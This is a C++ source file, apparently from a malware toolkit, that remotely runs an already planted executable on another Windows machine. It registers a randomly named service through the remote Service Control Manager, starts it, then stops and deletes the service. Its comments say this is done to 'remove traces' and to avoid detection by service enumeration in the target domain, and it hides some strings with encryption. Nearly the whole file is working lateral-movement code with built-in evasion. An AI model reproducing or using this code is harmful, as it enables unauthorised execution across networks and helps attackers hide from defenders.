/*
	SCM.cpp
	Service Control Manager routines to remotely register and execute already planted file as a service

*/

#include <windows.h>

#include "..\inc\dbg.h"

#include "..\inc\mem.h"					// ?? to be converted to API ??
#include "..\inc\CryptoStrings.h"		// ?? to be converted to API ??
#include "..\inc\MyStringRoutines.h"	// ?? to be converted to API ??

#include "SCM.h"

/*
	Called to perform cleanup of params structure, by init func or thread
*/
VOID _drCleanupRemoteServiceThreadParams(REMSRV_THREAD_PARAMS *ptp)
{
	DbgPrint("entered");
	if (!ptp) { DbgPrint("ERR: no params passed"); return; }

	if (ptp->hSyncObject) CloseHandle(ptp->hSyncObject);
	if (ptp->hThreadStarted) CloseHandle(ptp->hThreadStarted);
	if (ptp->hCallerExited) CloseHandle(ptp->hCallerExited);
	if (ptp->wszRemoteFilename) my_free(ptp->wszRemoteFilename);
	if (ptp->wszTargetMachine) my_free(ptp->wszTargetMachine);

	my_free(ptp);

	DbgPrint("params dealloc done");
}

/*
Used by drRemoteExec() internally, attempts to remotely exec file using SCM manager API.
NB: use %windir% or %SystemRoot% in path instead of c:\windows, because system may be placed on different drive or path on remote system
NB2: do not leave service, it should be removed after successfull startup (remote exe invokes self copy) to prevent identification of new services by enum on
periodical basis in target domain.

wszRemoteFilename - filename placed to ADMIN$ (c:\windows) share, format 'filename.ext'
*/
DWORD WINAPI _drthrRemoteService(LPVOID pParameter)
{
	REMSRV_THREAD_PARAMS *ptp = (REMSRV_THREAD_PARAMS *)pParameter;	// param struct supplied by caller
	//	BOOL bRes = FALSE;	// func result
	SC_HANDLE hSCM = NULL;	// SCM connection handle
	SC_HANDLE hService = NULL;	// handle to a newly created service
	LPWSTR wszRndServiceName;	// internally allocated buffer to hold rnd generated service name
	LPWSTR wszRemoteCmdLine;	// name of a file on remote system, with %windir% path
	LPWSTR wszS;	// decrypt buffer
	BOOL bStartRes = FALSE, bStopRes = FALSE;	// service start/stop result
	DWORD dwLE = 0;	// last error
	SERVICE_STATUS ss = { 0 };	// service result on stop request

	// perform init and report to caller it is safe to start waits
	SetEvent(ptp->hThreadStarted);

	// try to open SCM on remote machine
	DbgPrint("connecting to SCM on remote machine");
	hSCM = OpenSCManager(ptp->wszTargetMachine, NULL, SC_MANAGER_ALL_ACCESS);

	// check result
	if (hSCM) {

		DbgPrint("connected OK");

		// generate random name using rndgen
		wszRndServiceName = (LPWSTR)my_alloc(1024);
		sr_genRandomChars(8, 16, wszRndServiceName);

		wszRemoteCmdLine = (LPWSTR)my_alloc(1024);
		wszS = CRSTRW("%windir%\\", "\xff\xbf\x34\x0c\xf6\xbf\x71\x13\xe6\xa9\xd0\xed\x1d\x02\xc8");
		lstrcpy(wszRemoteCmdLine, wszS);
		lstrcat(wszRemoteCmdLine, ptp->wszRemoteFilename);
		DbgPrint("remote cmdline [%ws]", wszRemoteCmdLine);

		// create new service on remote machine
		// not sure if SERVICE_INTERACTIVE_PROCESS really needed here
		hService = CreateService(hSCM, wszRndServiceName, NULL, SC_MANAGER_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, wszRemoteCmdLine,
			NULL, NULL, NULL, NULL, L"");

		if (hService) {

			// StartService() will not return control until exe notifies SCM about it's startup OR a timeout exceeded
			// caller need to attempt interaction while timeout is counting down, so notify async caller proc it's time to return execution
			// all needed further cleaup will be done internally later
			ptp->bResult = TRUE;
			SetEvent(ptp->hSyncObject);

			DbgPrint("service created, starting...");
			if (!(bStartRes = StartService(hService, 0, NULL))) { dwLE = GetLastError(); }

			// check result - if ok, or exe didn't call SCM notify API
			if ((bStartRes) || (ERROR_SERVICE_REQUEST_TIMEOUT == dwLE)) {

				DbgPrint("start OK, res=%u le=%u", bStartRes, dwLE);
				//bRes = TRUE;

			}
			else { DbgPrint("ERR: failed to StartService() le %u", dwLE); }

			// do cleanup, exe is assumed to copy/restart self to be removable and leave no traces
			DbgPrint("pre wait before removing traces");
			Sleep(5000);
			DbgPrint("removing traces");

			// if service was started ok - attempt to stop it
			if (bStartRes) {
				DbgPrint("service was running, attempting to shut it down");
				if (!ControlService(hService, SERVICE_CONTROL_STOP, &ss)) {

					// check error code
					// NB: ERROR_SERVICE_NOT_ACTIVE is acceptable, all others seems to cause some severe error
					DbgPrint("WARN: error while calling ControlService() - le %u", GetLastError());

				}
				else { DbgPrint("service shutdowned OK"); }
			}

			// now remove the service from SCM
			if (!(bStopRes = DeleteService(hService))) { dwLE = GetLastError(); }
			if ((bStopRes) || (ERROR_SERVICE_MARKED_FOR_DELETE == dwLE)) { DbgPrint("deletion OK: res=%u le=%u", bStopRes, dwLE); }
			else { DbgPrint("WARN: failed to DeleteService() le=%u", dwLE); }

			// close handle to allow actual service removal
			CloseServiceHandle(hService);

		}
		else { DbgPrint("ERR: CreateService() failed with code %u", GetLastError()); }

		// end connection
		CloseServiceHandle(hSCM);

		// free buff used
		my_free(wszRemoteCmdLine);
		my_free(wszRndServiceName);

	}
	else { DbgPrint("ERR: connection failed, err %u", GetLastError()); }

	// we may get here in case of some error occured, and caller is still running
	// so need a safe way for caller to receive results
	if (WAIT_OBJECT_0 == WaitForSingleObject(ptp->hCallerExited, 60000)) {

		// do cleanup on passed params
		DbgPrint("safe to cleanup params");
		_drCleanupRemoteServiceThreadParams(ptp);

	}
	else { DbgPrint("ERR: caller seems to be still running, no cleanup will be performed"); }

	ExitThread(0);
}



/*
Creates a thread to interact with remote machine's SCM
Due to StartService() will not return until timeout, this routine is essential
to perform communication while timeout is counting down
*/
BOOL scmStartRemoteFileAsServiceAsync(LPWSTR wszTargetMachine, LPWSTR wszRemoteFilename)
{
	BOOL bRes = FALSE;	// function's result
	REMSRV_THREAD_PARAMS *ptp;	// ptr to internally allocated buffer with thread params

	HANDLE hThread;
	DWORD dwThreadId;

	// alloc buffer to be used and deallocated by a new thread
	ptp = (REMSRV_THREAD_PARAMS *)my_alloc(sizeof(REMSRV_THREAD_PARAMS));

	// fill values
	ptp->wszRemoteFilename = (LPWSTR)my_alloc(1024); lstrcpy(ptp->wszRemoteFilename, wszRemoteFilename);
	ptp->wszTargetMachine = (LPWSTR)my_alloc(1024); lstrcpy(ptp->wszTargetMachine, wszTargetMachine);
	ptp->hSyncObject = CreateEvent(NULL, TRUE, FALSE, NULL);
	ptp->hThreadStarted = CreateEvent(NULL, TRUE, FALSE, NULL);
	ptp->hCallerExited = CreateEvent(NULL, TRUE, FALSE, NULL);

	// create worker thread
	if (!(hThread = CreateThread(NULL, 0, _drthrRemoteService, ptp, 0, &dwThreadId))) {
		DbgPrint("ERR: failed to create worker thread, le %u", GetLastError());
		_drCleanupRemoteServiceThreadParams(ptp);
		return bRes;
	} // ! created thread

	// got here if thread created

	// wait for thread to perform init
	DbgPrint("waiting for init of thread");
	if (WAIT_OBJECT_0 != WaitForSingleObject(ptp->hThreadStarted, 60000)) {
		DbgPrint("ERR: timeout exceeded waiting for thread to init, exiting");
		TerminateThread(hThread, 0);
		_drCleanupRemoteServiceThreadParams(ptp);
		return bRes;
	} // ! inited thread

	DbgPrint("init done, waiting for result");
	if (WAIT_OBJECT_0 != WaitForSingleObject(ptp->hSyncObject, 60000)) {
		DbgPrint("ERR: timeout waiting for result, exiting");
		// let thread to perform cleanup on it's own
		return bRes;
	}
	else {
		DbgPrint("thread supplied result %u", ptp->bResult)
			bRes = ptp->bResult;
	}

	CloseHandle(hThread);	// no need for it's handle anymore

	// notify thread we are exited and it may safely dealloc params structure
	SetEvent(ptp->hCallerExited);

	return bRes;
}
